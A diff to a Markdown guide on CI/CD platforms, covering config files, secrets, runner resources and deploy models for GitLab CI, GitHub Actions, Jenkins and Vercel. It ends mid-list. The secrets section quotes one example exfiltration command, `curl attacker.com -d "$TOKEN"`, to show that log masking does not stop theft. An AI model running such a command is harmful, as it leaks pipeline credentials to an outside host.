@@ -1,6 +1,6 @@
 # CI/CD Platforms
 
-How a repository becomes a pipeline: which file to add, how the platform reaches your code, where secrets live, and what resources your jobs actually get. Covers **GitLab CI**, **GitHub Actions**, **Jenkins**, and **Vercel**.
+How a repository becomes a pipeline: which file to add, what goes in it, how the platform reaches your code, where secrets live, and what resources your jobs actually get. Covers **GitLab CI**, **GitHub Actions**, **Jenkins**, and **Vercel**.
 
 ---
 
@@ -28,44 +28,40 @@ flowchart LR
 
 Everything left of "Build artifact" is **CI**. Everything right of it is **CD**. The only difference between Delivery and Deployment is whether that gate exists.
 
-Practical reading:
-
 - **CI is non-negotiable** and the cheapest thing on this page. If you do nothing else, run your tests on every push.
-- **Continuous Delivery is the sane default** for most teams. You are always *able* to ship; you decide *when*.
-- **Continuous Deployment requires earning it** — strong test coverage, feature flags, fast rollback, and real monitoring. Without those it is just an automated way to break production.
+- **Continuous Delivery is the sane default.** You are always *able* to ship; you decide *when*.
+- **Continuous Deployment must be earned** — strong tests, feature flags, fast rollback, real monitoring. Without those it is an automated way to break production.
 
-Vercel is Continuous Deployment out of the box: push to the production branch and it is live. GitLab, GitHub, and Jenkins give you the gate and let you choose.
+Vercel is Continuous Deployment out of the box. GitLab, GitHub, and Jenkins give you the gate and let you choose.
 
-For where this sits in the wider delivery process, see [Lifecycle → CI/CD](../basics/lifecycle.md#cicd). The rest of this page is mechanics.
+For where this sits in the wider delivery process, see [Lifecycle → CI/CD](../basics/lifecycle.md#cicd).
 
 ---
 
 ## 1. What Makes a Repo "Have CI/CD"
 
-One file, in a path the platform looks for. That is the entire on-ramp.
+One file, in a path the platform looks for.
 
-| Platform | File you add | Location |
-|---|---|---|
-| **GitLab CI** | `.gitlab-ci.yml` | Repo root |
-| **GitHub Actions** | `ci.yml` (any name) | `.github/workflows/` |
-| **Jenkins** | `Jenkinsfile` | Repo root |
-| **Vercel** | *nothing required* | `vercel.json` at root, optional |
+| Platform | File you add | Location | Language |
+|---|---|---|---|
+| **GitLab CI** | `.gitlab-ci.yml` | Repo root | YAML |
+| **GitHub Actions** | `ci.yml` (any name) | `.github/workflows/` | YAML |
+| **Jenkins** | `Jenkinsfile` | Repo root | Groovy DSL |
+| **Vercel** | *nothing required* | `vercel.json` / `vercel.ts` at root | JSON / TypeScript |
 
-GitLab, GitHub, and Jenkins read that file and do what it says. **Vercel is different**: it inspects your `package.json` and directory layout, detects the framework, and applies a preset install/build command. You only add `vercel.json` to *override* routing, headers, or build settings.
-
-The file is a contract: *on this event, run these steps, in this environment*. Everything else is the platform's job.
+GitLab, GitHub, and Jenkins read that file and do what it says. **Vercel is different**: it inspects `package.json` and your directory layout, detects the framework, and applies a preset install and build command. You add `vercel.json` only to *override* something.
 
 ---
 
 ## 2. How the Platform Reaches Your Code
 
-The pipeline is the same everywhere:
+The shape is the same everywhere:
 
 ```mermaid
 flowchart LR
-    D[git push] --> F[Forge: GitLab / GitHub]
+    D[git push] --> F[Forge: GitLab or GitHub]
     F --> Q[Job queue]
-    Q --> R[Runner / agent]
+    Q --> R[Runner or agent]
     R --> C[Clone repo, read config]
     C --> E[Execute steps]
     E --> S[Report status back to commit or PR]
@@ -75,132 +71,509 @@ What differs is **which direction the connection opens** — and that decides yo
 
 ```mermaid
 flowchart TB
-    subgraph Outbound
-      RN[Runner on your network] -->|long-poll, outbound only| GC[GitLab / GitHub coordinator]
-    end
-    subgraph Inbound
-      GH[Forge webhook] -->|HTTP POST, inbound| JK[Jenkins must be reachable]
-    end
+    RN[Runner on your network] -->|long-poll, outbound only| GC[GitLab or GitHub coordinator]
+    GH[Forge webhook] -->|HTTP POST, inbound| JK[Jenkins must be reachable]
 ```
 
-| Platform | Connection | Runs the job | Needs an inbound port? |
-|---|---|---|---|
-| **GitLab CI** | Runner registers with a token, then **long-polls** the coordinator | GitLab-hosted or self-hosted runners | **No** |
-| **GitHub Actions** | Same model — runner polls out | GitHub-hosted or self-hosted runners | **No** |
-| **Jenkins** | Forge sends a **webhook** to your Jenkins URL | Jenkins controller + agents | **Yes** (or fall back to SCM polling) |
-| **Vercel** | You install the Vercel **Git App** (OAuth) on the org; the forge webhooks Vercel | Vercel's build machines | No (Vercel is the public endpoint) |
+| Platform | Connection | Needs an inbound port? |
+|---|---|---|
+| **GitLab CI** | Runner registers with a token, then **long-polls** the coordinator | **No** |
+| **GitHub Actions** | Same model — runner polls out | **No** |
+| **Jenkins** | Forge sends a **webhook** to your Jenkins URL | **Yes**, or fall back to SCM polling |
+| **Vercel** | You install the Vercel **Git App**; the forge webhooks Vercel | No — Vercel is the public endpoint |
 
-This is the practical difference people trip over. **GitLab and GitHub runners work from behind NAT with no ports open** — they dial out. **Jenkins is a server**: the forge must be able to reach it, which means a public URL, a tunnel, or SCM polling (which is slower and wasteful). That single fact drives most of the "why is Jenkins harder to host" experience.
-
-Vercel's model is a third thing: you are not running CI, you are granting a SaaS read access to your repo and letting it build. Push to any branch → **preview deployment**; merge to the production branch → **production deployment**.
+**GitLab and GitHub runners work from behind NAT with no ports open** — they dial out. **Jenkins is a server**: the forge must reach it, which means a public URL, a tunnel, or slow SCM polling. That single fact drives most of the "why is Jenkins harder to host" experience.
 
 ---
 
-## 3. Minimum Working Config
+## 3. GitLab CI — `.gitlab-ci.yml`
 
-=== "GitLab"
+```mermaid
+flowchart LR
+    P[Push or MR] --> GL[GitLab]
+    GL --> PL[Pipeline: stages and jobs]
+    RN[Runner polls for work] --> GL
+    PL --> EX[Executor: docker, shell, or kubernetes]
+    EX --> AR[Artifacts and cache]
+    EX --> RG[Container registry]
+    AR --> EN[Environment: staging or production]
+```
 
-    ```yaml
-    # .gitlab-ci.yml
-    stages: [test, build, deploy]
+### Top-level keywords
 
-    test:
-      stage: test
-      image: python:3.12
-      script:
-        - pip install -r requirements.txt
-        - pytest
+| Keyword | What it does |
+|---|---|
+| `stages` | Names and order of pipeline stages |
+| `default` | Default values inherited by all jobs — `image`, `before_script`, `retry`, `tags` |
+| `variables` | Pipeline-wide CI/CD variables |
+| `workflow` | Controls whether the pipeline runs at all — the top-level gate |
+| `include` | Import config from other files, projects, templates, or components |
+| `spec` | Declare typed `inputs` for a reusable config file |
 
-    build:
-      stage: build
-      image: docker:27
-      services: [docker:27-dind]
-      script:
-        - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .
-        - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
-      rules:
-        - if: $CI_COMMIT_BRANCH == "main"
-    ```
+### Job keywords
 
-=== "GitHub"
+Anything that isn't a reserved word is a job name. These are the keywords inside one:
 
-    ```yaml
-    # .github/workflows/ci.yml
-    name: CI
-    on:
-      push:
-        branches: [main]
-      pull_request:
+| Keyword | What it does |
+|---|---|
+| `script` | The shell commands to run. The only required key |
+| `before_script` / `after_script` | Commands run before / after `script`. `after_script` runs even on failure |
+| `stage` | Which stage the job belongs to |
+| `image` | Docker image the job runs in |
+| `services` | Sidecar containers — databases, or `docker:dind` for a Docker daemon |
+| `needs` | Depend on specific jobs instead of the whole previous stage — turns the pipeline into a **DAG** |
+| `rules` | Conditions deciding whether the job exists, and with what attributes |
+| `artifacts` | Files to keep and pass to later jobs |
+| `cache` | Files to reuse across pipeline runs |
+| `dependencies` | Restrict which artifacts this job downloads |
+| `environment` | Name the environment this job deploys to — powers the environments UI and rollback |
+| `when` | `on_success`, `on_failure`, `always`, `manual`, `delayed` |
+| `allow_failure` | Job may fail without failing the pipeline |
+| `retry` | Auto-retry count and conditions |
+| `timeout` | Per-job timeout, overriding the project setting |
+| `parallel` | Run N copies, or a `matrix` of variable combinations |
+| `resource_group` | Serialise jobs that must not run concurrently — deploys, mainly |
+| `interruptible` | Let a newer pipeline cancel this job |
+| `extends` | Inherit from a hidden job template |
+| `tags` | Select which runners may pick the job up |
+| `trigger` | Start a downstream pipeline |
+| `secrets` | Pull secrets from an external manager |
+| `coverage` | Regex to scrape a coverage number from the log |
 
-    jobs:
-      test:
-        runs-on: ubuntu-latest
-        steps:
-          - uses: actions/checkout@v4
-          - uses: actions/setup-python@v5
-            with:
-              python-version: '3.12'
-          - run: pip install -r requirements.txt
-          - run: pytest
-    ```
+Full list: [GitLab CI/CD YAML reference](https://docs.gitlab.com/ci/yaml/).
 
-=== "Jenkins"
+### Useful predefined variables
 
-    ```groovy
-    // Jenkinsfile
-    pipeline {
-      agent { docker { image 'python:3.12' } }
-      options { timeout(time: 20, unit: 'MINUTES') }
-      stages {
-        stage('Test') {
-          steps {
-            sh 'pip install -r requirements.txt'
-            sh 'pytest'
-          }
+| Variable | Value |
+|---|---|
+| `CI_COMMIT_SHA` / `CI_COMMIT_SHORT_SHA` | Full / short commit hash — use as your image tag |
+| `CI_COMMIT_BRANCH` | Branch name, absent for tags and MR pipelines |
+| `CI_DEFAULT_BRANCH` | Usually `main` — compare against this rather than hardcoding |
+| `CI_PIPELINE_SOURCE` | `push`, `merge_request_event`, `schedule`, `web`, `api` |
+| `CI_REGISTRY` / `CI_REGISTRY_IMAGE` | Built-in container registry host / this project's image path |
+| `CI_JOB_TOKEN` | Short-lived token to authenticate to the registry and API as this job |
+| `CI_MERGE_REQUEST_IID` | MR number, on MR pipelines |
+| `CI_ENVIRONMENT_NAME` | Resolved `environment:name` |
+
+Full list: [predefined variables](https://docs.gitlab.com/ci/variables/predefined_variables/).
+
+### A realistic file
+
+```yaml
+# .gitlab-ci.yml
+stages: [test, build, deploy]
+
+default:
+  image: python:3.12
+  interruptible: true          # newer pipeline cancels this one
+  retry:
+    max: 2
+    when: [runner_system_failure, stuck_or_timeout_failure]
+
+variables:
+  PIP_CACHE_DIR: "$CI_PROJECT_DIR/.cache/pip"
+
+workflow:                       # don't run duplicate branch+MR pipelines
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+    - if: $CI_COMMIT_TAG
+
+.python:                        # hidden job = reusable template
+  cache:
+    key:
+      files: [requirements.txt]  # cache invalidates when deps change
+    paths: [.cache/pip]
+  before_script:
+    - pip install -r requirements.txt
+
+lint:
+  extends: .python
+  stage: test
+  script: [ruff check .]
+
+test:
+  extends: .python
+  stage: test
+  script:
+    - pytest --junitxml=report.xml --cov=app
+  coverage: '/TOTAL.*\s(\d+%)$/'
+  artifacts:
+    when: always
+    reports:
+      junit: report.xml         # test results render in the MR
+
+build:
+  stage: build
+  needs: [lint, test]           # DAG: starts the moment both finish
+  image: docker:27
+  services: [docker:27-dind]
+  script:
+    - echo "$CI_REGISTRY_PASSWORD" | docker login -u "$CI_REGISTRY_USER" --password-stdin "$CI_REGISTRY"
+    - docker build -t "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA" .
+    - docker push "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA"
+  rules:
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+
+deploy:production:
+  stage: deploy
+  needs: [build]
+  environment:
+    name: production
+    url: https://example.com
+  resource_group: production    # never two deploys at once
+  when: manual                  # <-- Continuous Delivery, not Deployment
+  script:
+    - ./deploy.sh "$CI_COMMIT_SHA"
+  rules:
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+```
+
+Notes worth internalising:
+
+- **`stages` vs `needs`.** Stages are a barrier: nothing in stage 2 starts until *all* of stage 1 finishes. `needs` builds a DAG so each job starts as soon as its own dependencies are done. On any pipeline with more than a few jobs, `needs` is a large wall-clock win.
+- **`rules` replaced `only`/`except`.** `only`/`except` still work but are no longer developed. Use `rules` with `if`, `changes`, and `exists`.
+- **`workflow:rules`** is how you stop the duplicate-pipeline problem where a push to a branch with an open MR runs everything twice.
+- **`services: [docker:27-dind]`** is Docker-in-Docker — how you get a daemon inside a job. This is the single most common first-pipeline stumble.
+- **`resource_group`** on deploys prevents two pipelines racing to production.
+- **Reuse:** `extends` + hidden `.jobs` for local templates, `include` for cross-project, and [CI/CD components](https://docs.gitlab.com/ci/components/) for versioned, publishable building blocks.
+
+---
+
+## 4. GitHub Actions — `.github/workflows/*.yml`
+
+```mermaid
+flowchart LR
+    EV[Event: push, PR, schedule, dispatch] --> WF[Workflow file]
+    WF --> JB[Jobs, optionally a matrix]
+    RU[Runner: hosted or self-hosted] --> JB
+    JB --> ST[Steps: uses an action or runs a shell command]
+    ST --> TK[GITHUB_TOKEN scoped by permissions]
+    ST --> OI[OIDC token exchanged for cloud credentials]
+```
+
+Multiple workflow files are normal and expected — one per concern (`ci.yml`, `release.yml`, `deploy.yml`), each with its own triggers.
+
+### Top-level keys
+
+| Key | What it does |
+|---|---|
+| `name` / `run-name` | Workflow name / the title of an individual run |
+| `on` | Triggers: `push`, `pull_request`, `schedule`, `workflow_dispatch`, `workflow_call`, `workflow_run`, `release` — with `branches`, `tags`, `paths` filters |
+| `permissions` | Scopes granted to `GITHUB_TOKEN`. Set this |
+| `env` | Environment variables for every job |
+| `defaults` | Default `shell` and `working-directory` |
+| `concurrency` | Group runs and optionally cancel in-progress ones |
+| `jobs` | The work |
+
+### Job and step keys
+
+| Key | What it does |
+|---|---|
+| `runs-on` | Runner label — `ubuntu-latest`, `ubuntu-slim`, or a self-hosted label |
+| `needs` | Job dependencies |
+| `if` | Conditional execution, using expressions |
+| `strategy.matrix` | Fan out across versions or OSes; `fail-fast`, `max-parallel` |
+| `steps[].uses` | Run a published action |
+| `steps[].run` | Run a shell command |
+| `steps[].with` | Inputs to the action |
+| `container` / `services` | Run the job in a container / attach sidecars |
+| `timeout-minutes` | Per-job timeout — default is 360, which is far too long |
+| `environment` | Deployment environment, which can require reviewers |
+| `outputs` | Values passed to dependent jobs |
+| `permissions` | Per-job token scopes, narrower than the workflow default |
+
+Full list: [workflow syntax](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax).
+
+### Contexts
+
+Expressions use `${{ }}` and read from contexts: `github` (event, ref, sha, actor), `secrets`, `vars`, `env`, `job`, `steps`, `matrix`, `needs`, `runner`.
+
+```yaml
+if: ${{ github.event_name == 'push' && github.ref == 'refs/heads/main' }}
+```
+
+### A realistic file
+
+```yaml
+# .github/workflows/ci.yml
+name: CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+permissions:
+  contents: read                # least privilege; add scopes per job as needed
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true      # supersede stale runs on the same branch
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    strategy:
+      fail-fast: false
+      matrix:
+        python: ['3.11', '3.12', '3.13']
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: ${{ matrix.python }}
+          cache: pip            # built-in dependency caching
+      - run: pip install -r requirements.txt
+      - run: pytest
+
+  build:
+    needs: test
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      packages: write           # needed to push to GHCR
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+      - uses: docker/build-push-action@v6
+        with:
+          push: true
+          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
+
+  deploy:
+    needs: build
+    runs-on: ubuntu-latest
+    environment: production     # required reviewers configured in repo settings
+    permissions:
+      id-token: write           # OIDC — no long-lived cloud keys
+      contents: read
+    steps:
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/deploy
+          aws-region: eu-west-1
+      - run: ./deploy.sh ${{ github.sha }}
+```
+
+Notes worth internalising:
+
+- **`permissions` defaults are too broad.** Set `contents: read` at the top and widen per job. This is the single highest-value line in an Actions file.
+- **`GITHUB_TOKEN` is created per run** and expires when it ends — you never manage it. Its power is exactly what `permissions` grants.
+- **OIDC (`id-token: write`) beats stored cloud keys.** The job exchanges a signed token for short-lived credentials. Nothing static to leak.
+- **`concurrency` with `cancel-in-progress`** stops five queued runs of the same branch burning minutes.
+- **Pin actions.** `@v4` is a mutable tag; a SHA is not. For anything touching secrets, pin the SHA.
+- **Reuse:** `workflow_call` for whole reusable workflows, composite actions for a bundle of steps.
+
+---
+
+## 5. Jenkins — `Jenkinsfile`
+
+```mermaid
+flowchart LR
+    PU[Push] --> WH[Forge webhook]
+    WH --> CT[Jenkins controller]
+    CT --> MB[Multibranch scan finds Jenkinsfile]
+    MB --> AG[Agent: label, docker, or kubernetes pod]
+    AG --> SG[Stages and steps]
+    SG --> PO[post: always, success, failure]
+    CT --> CR[Credentials store injects secrets]
+```
+
+Jenkins is the only one of the four you host yourself, so it is the only one where the *controller* is your problem. Use a **Multibranch Pipeline** or **Organization Folder** job: it scans branches and PRs, finds a `Jenkinsfile` in each, and creates jobs automatically.
+
+### Declarative pipeline structure
+
+| Directive | What it does |
+|---|---|
+| `agent` | Where to run: `any`, `none`, `label 'x'`, `docker`, `dockerfile`, `kubernetes` |
+| `environment` | Environment variables; supports `credentials('id')` |
+| `options` | `timeout`, `retry`, `buildDiscarder`, `disableConcurrentBuilds`, `timestamps` |
+| `parameters` | Inputs for manually triggered builds |
+| `triggers` | `cron`, `pollSCM`, `upstream` — unnecessary if webhooks work |
+| `tools` | Auto-install a JDK, Maven, or Node version |
+| `stages` / `stage` | The pipeline body |
+| `steps` | Commands: `sh`, `bat`, `withCredentials`, `archiveArtifacts`, `junit` |
+| `when` | Conditional stage execution — `branch`, `changeRequest`, `expression` |
+| `parallel` | Run stages concurrently |
+| `matrix` | Fan out over `axes`, with `excludes` |
+| `input` | Pause for human approval — the CD gate |
+| `post` | `always`, `success`, `failure`, `unstable`, `changed`, `cleanup` |
+
+Full reference: [Pipeline syntax](https://www.jenkins.io/doc/book/pipeline/syntax/).
+
+### A realistic file
+
+```groovy
+// Jenkinsfile
+pipeline {
+  agent none                              // pick an agent per stage
+
+  options {
+    timeout(time: 30, unit: 'MINUTES')
+    buildDiscarder(logRotator(numToKeepStr: '30'))
+    disableConcurrentBuilds()
+    timestamps()
+  }
+
+  environment {
+    REGISTRY = 'registry.example.com'
+    IMAGE    = "${REGISTRY}/app:${env.GIT_COMMIT}"
+  }
+
+  stages {
+    stage('Test') {
+      agent { docker { image 'python:3.12'; args '--memory=4g --cpus=2' } }
+      steps {
+        sh 'pip install -r requirements.txt'
+        sh 'pytest --junitxml=report.xml'
+      }
+      post {
+        always { junit 'report.xml' }     // publish results even on failure
+      }
+    }
+
+    stage('Build and push') {
+      when { branch 'main' }
+      agent { label 'docker' }
+      steps {
+        withCredentials([usernamePassword(
+            credentialsId: 'registry-creds',
+            usernameVariable: 'U', passwordVariable: 'P')]) {
+          sh 'echo "$P" | docker login -u "$U" --password-stdin $REGISTRY'
+          sh 'docker build -t $IMAGE .'
+          sh 'docker push $IMAGE'
         }
       }
     }
-    ```
 
-=== "Vercel"
-
-    ```json
-    // vercel.json - only if you need to override the detected defaults
-    {
-      "buildCommand": "npm run build",
-      "outputDirectory": "dist",
-      "framework": "vite"
+    stage('Approve') {
+      when { branch 'main' }
+      steps {
+        input message: 'Deploy to production?', ok: 'Deploy'
+      }
     }
-    ```
 
-`services: [docker:27-dind]` in the GitLab example is how you get a Docker daemon inside a job — the "Docker-in-Docker" pattern that trips up most first pipelines. GitHub's hosted runners already have a daemon, so `docker build` just works.
+    stage('Deploy') {
+      when { branch 'main' }
+      agent { label 'deploy' }
+      steps { sh "./deploy.sh ${env.GIT_COMMIT}" }
+    }
+  }
+
+  post {
+    failure { slackSend channel: '#ci', message: "FAILED ${env.BUILD_URL}" }
+    cleanup { cleanWs() }                 // reclaim disk on the agent
+  }
+}
+```
+
+Notes worth internalising:
+
+- **`agent none` at the top, an agent per stage.** Otherwise you hold an executor while waiting for approval.
+- **Never build on the controller.** One runaway job takes Jenkins down with it.
+- **`cleanWs()` in `post`.** Jenkins agents are long-lived, so workspaces accumulate until the disk dies. See §8.
+- **Declarative over scripted.** Scripted (bare Groovy) is more powerful and much harder to maintain; reach for it only when declarative genuinely can't express the thing.
+- **Shared libraries** (`@Library('my-lib')`) are how you avoid copying the same 200 lines into 40 repos.
+- **`disableConcurrentBuilds()`** is Jenkins' equivalent of GitLab's `resource_group`.
 
 ---
 
-## 4. Environment Variables and Secrets
+## 6. Vercel — `vercel.json` (Optional)
 
-Every platform separates **non-secret config** from **secrets**. Use both.
+```mermaid
+flowchart LR
+    PU[Push to any branch] --> GA[Vercel Git App webhook]
+    GA --> DT[Framework auto-detection]
+    DT --> BM[Build machine runs install and build]
+    BM --> BO[Build Output API: static assets plus functions]
+    BO --> IM[Immutable deployment with unique URL]
+    IM --> AL[Alias: production domain or preview URL]
+```
+
+The mental model is different from the other three. You are not writing a pipeline — you are granting a platform read access to your repo. Every push produces an **immutable deployment** with its own URL. Production is just an **alias** pointing at one of them, which is why **rollback is repointing the alias**, not rebuilding.
+
+- Push to the production branch → **production deployment**
+- Push to any other branch → **preview deployment**, commented on the PR
+
+### `vercel.json` keys
+
+| Key | What it does |
+|---|---|
+| `$schema` | Enables IDE autocomplete and validation |
+| `framework` | Override the detected framework preset |
+| `buildCommand` / `installCommand` / `devCommand` | Override the detected commands |
+| `outputDirectory` | Where the build output lands |
+| `rewrites` / `redirects` / `headers` | Routing and response headers |
+| `cleanUrls` / `trailingSlash` | URL shape |
+| `functions` | Per-function memory, max duration, and runtime |
+| `crons` | Scheduled function invocations |
+| `regions` / `functionFailoverRegions` | Where functions run |
+| `images` | Image optimisation settings |
+| `ignoreCommand` | Exit non-zero to skip the build entirely |
+| `public` | Make deployment logs and source publicly readable |
+
+There is also **`vercel.ts`**, which supports the same properties but computes them at build time. One config file per project. Full reference: [project configuration](https://vercel.com/docs/project-configuration).
+
+### A realistic file
+
+```json
+{
+  "$schema": "https://openapi.vercel.sh/vercel.json",
+  "framework": "nextjs",
+  "buildCommand": "npm run build",
+  "outputDirectory": ".next",
+  "regions": ["fra1"],
+  "functions": {
+    "api/report/*.ts": { "memory": 3009, "maxDuration": 60 }
+  },
+  "crons": [
+    { "path": "/api/cron/digest", "schedule": "0 6 * * *" }
+  ],
+  "headers": [
+    {
+      "source": "/(.*)",
+      "headers": [
+        { "key": "X-Content-Type-Options", "value": "nosniff" },
+        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" }
+      ]
+    }
+  ],
+  "ignoreCommand": "git diff --quiet HEAD^ HEAD -- ./apps/web"
+}
+```
+
+`ignoreCommand` is the monorepo saver: skip the build when nothing in the relevant path changed.
+
+---
+
+## 7. Environment Variables and Secrets
 
 | Platform | Where you set it | Scoping | Masking |
 |---|---|---|---|
-| **GitLab** | Settings → CI/CD → Variables, or `variables:` in YAML | Per project/group, **protected** (protected branches only), **masked** | Masked variables hidden in logs |
-| **GitHub** | Settings → Secrets and variables (`secrets.*` and `vars.*`) | Repo, org, or **environment** (with required reviewers) | `secrets.*` auto-redacted in logs |
-| **Jenkins** | Credentials plugin, then `withCredentials` or `environment {}` | Global, folder, or per-job | Masked when bound as credentials |
-| **Vercel** | Project → Settings → Environment Variables | Per environment: Production / Preview / Development | Mark as **Sensitive** to make write-only |
+| **GitLab** | Settings → CI/CD → Variables, or `variables:` | Project / group / instance; **protected** = protected branches and tags only | **Masked** variables hidden in job logs |
+| **GitHub** | Settings → Secrets and variables (`secrets.*`, `vars.*`) | Repo, org, or **environment** with required reviewers | `secrets.*` auto-redacted in logs |
+| **Jenkins** | Credentials store, then `credentials()` or `withCredentials` | Global, folder, or per-job | Masked when bound as a credential |
+| **Vercel** | Project → Settings → Environment Variables | Per environment: Production / Preview / Development | Mark **Sensitive** to make write-only |
 
 Rules that matter:
 
-- **Never put a secret in the YAML file.** It is in git history forever. Reference it: `$MY_TOKEN`, `${{ secrets.MY_TOKEN }}`.
-- **Prefer OIDC over long-lived cloud keys.** GitLab, GitHub, and Jenkins can all exchange a short-lived signed token for AWS/GCP/Azure credentials. No static keys to leak or rotate.
-- **Scope secrets to protected branches / environments.** A production deploy key available to every feature branch is a production deploy key available to anyone who can open a branch.
-- **Fork pull requests are hostile input.** Secrets are withheld from fork PRs by default on GitHub — do not defeat that with `pull_request_target` unless you know exactly what you are doing. Vercel requires explicit authorization to deploy a fork PR for the same reason.
-- **Masking is not security.** It hides the literal string in logs; it does not stop `curl attacker.com -d "$TOKEN"`.
+- **Never put a secret in the config file.** It is in git history forever. Reference it: `$TOKEN`, `${{ secrets.TOKEN }}`, `credentials('id')`.
+- **Prefer OIDC over long-lived cloud keys.** All three CI platforms can exchange a short-lived signed token for AWS/GCP/Azure credentials. Nothing static to leak or rotate.
+- **Scope to protected branches and environments.** A production deploy key readable from every feature branch is readable by anyone who can push a branch.
+- **Fork pull requests are hostile input.** GitHub withholds secrets from fork PRs by default — do not defeat that with `pull_request_target` casually. Vercel requires explicit authorization to deploy a fork PR for the same reason.
+- **Masking is not security.** It hides a literal string in logs; it does not stop `curl attacker.com -d "$TOKEN"`.
+- **Separate config from secrets.** GitLab variables and GitHub `vars.*` are for non-sensitive config — use them, so the secret list stays short enough to audit.
 
 ---
 
-## 5. Resource Control: CPU, RAM, Disk
-
-What your job actually gets, and where you change it.
+## 8. Resource Control: CPU, RAM, Disk
 
 ### GitHub Actions — fixed tiers
 
@@ -212,14 +585,13 @@ Hosted runner specs, **as of August 2026** ([reference](https://docs.github.com/
 | `ubuntu-latest` | **Private** | 2 | 8 GB | 14 GB |
 | `ubuntu-slim` | Either | 1 | 5 GB | 14 GB |
 
-Public repos get double the machine, free and unlimited. `ubuntu-slim` is cheap but has a **15-minute job timeout**. You cannot tune these — you pick a label, or use larger runners (paid), or self-host.
+Not tunable — pick a label, pay for larger runners, or self-host. `ubuntu-slim` has a **15-minute job timeout**.
 
 ### GitLab — you configure the runner
 
-Self-hosted runners take hard limits in `config.toml`:
-
 ```toml
-concurrent = 4                     # total jobs across all runners
+# /etc/gitlab-runner/config.toml
+concurrent = 4                     # total jobs across all runners on this host
 
 [[runners]]
   request_concurrency = 1
@@ -230,7 +602,7 @@ concurrent = 4                     # total jobs across all runners
     cpus = "2"
 ```
 
-On the Kubernetes executor, set requests and limits per job instead:
+On the Kubernetes executor, set it per job instead:
 
 ```yaml
 variables:
@@ -242,13 +614,11 @@ variables:
 
 ### Jenkins — executors and agents
 
-Jenkins has no per-job limits of its own. Control comes from three places:
+No per-job limits of its own. Control comes from three places:
 
-- **Executors per agent** — how many jobs run concurrently on one machine. Set it to the core count, not higher.
+- **Executors per agent** — concurrent jobs on one machine. Set it to the core count, not higher.
 - **Docker agent args** — `agent { docker { image 'node:22'; args '--memory=4g --cpus=2' } }`.
-- **Kubernetes plugin pod templates** — real requests/limits, the same as any pod.
-
-Never run builds on the controller. One runaway job takes down Jenkins itself.
+- **Kubernetes plugin pod templates** — real requests and limits, like any pod.
 
 ### Vercel — pick a machine
 
@@ -258,59 +628,59 @@ Never run builds on the controller. One runaway job takes down Jenkins itself.
 | Enhanced | 8 | 16 GB | 64 GB |
 | Turbo | 30 | 60 GB | 64 GB |
 
-Plus fixed limits: **45-minute build timeout**, **1 GB build cache** retained one month, and a per-plan cap on concurrent builds. Elastic machines auto-size and bill per CPU-minute.
+Fixed limits: **45-minute build timeout**, **1 GB build cache** retained one month, per-plan concurrent build cap. Elastic machines auto-size and bill per CPU-minute. Function memory and duration are separate, set via `functions` in `vercel.json`.
 
-### Disk and inodes
+### Disk and inodes on self-hosted runners
 
-Nobody documents this and it is the most common self-hosted runner failure: **runners fill up**. Docker layers, node_modules, and caches accumulate across jobs on a long-lived machine, and the failure is often inode exhaustion rather than bytes — `df -h` looks fine while every build fails.
+The most common self-hosted failure, and nobody documents it: **runners fill up**. Docker layers, `node_modules`, and caches accumulate across jobs on a long-lived machine, and the failure is often **inode exhaustion rather than bytes** — `df -h` looks fine while every build fails with `No space left on device`.
 
 ```bash
-df -h && df -i                     # check both
+df -h && df -i                     # always check both
 docker system prune -af --volumes  # on a schedule, not after the outage
 ```
 
-See [Running a Server §6](server_operations.md#6-disk-the-three-ways-it-fills-up) for the full diagnosis. Ephemeral runners (fresh VM or pod per job) make the problem disappear entirely — prefer them.
+Full diagnosis in [Running a Server §6](server_operations.md#6-disk-the-three-ways-it-fills-up). **Ephemeral runners** — a fresh VM or pod per job — make this class of problem disappear; prefer them when you can.
 
 ---
 
-## 6. How the Deploy Actually Happens
-
-Two models, and it is worth knowing which one you are in:
+## 9. How the Deploy Actually Happens
 
 ```mermaid
 flowchart LR
     B[CI job builds artifact] --> R[Registry or artifact store]
     R --> P[Push: CI connects out and applies]
     R --> G[Pull: agent in cluster watches registry]
-    P --> T[Target: server, k8s, CDN]
+    P --> T[Target: server, k8s, or CDN]
     G --> T
 ```
 
 - **Push deploy** — the CI job holds production credentials and runs `ssh`, `kubectl apply`, `helm upgrade`, or `docker compose up`. Simple; your CI system becomes a high-value target.
-- **Pull deploy (GitOps)** — an agent inside the target environment watches a repo or registry and reconciles. CI never holds production credentials. More moving parts, much better blast radius.
+- **Pull deploy (GitOps)** — an agent inside the target watches a repo or registry and reconciles. CI never holds production credentials. More moving parts, far better blast radius.
 
-Vercel is a third model again: build output goes straight to its own edge network and CDN. Every deploy is immutable and independently addressable, so **rollback is repointing an alias**, not rebuilding.
+Vercel is neither: build output goes to its own edge network, every deploy is immutable, and rollback is an alias change.
 
 ---
 
-## 7. Best Practices
+## 10. Best Practices
 
-- **Pipeline fails fast and cheap.** Lint and unit tests first, integration and builds after. Do not wait ten minutes to learn a formatting error.
-- **Pin action and image versions.** `actions/checkout@v4`, `python:3.12` — not `latest`. Better still, pin actions by commit SHA; tags are mutable.
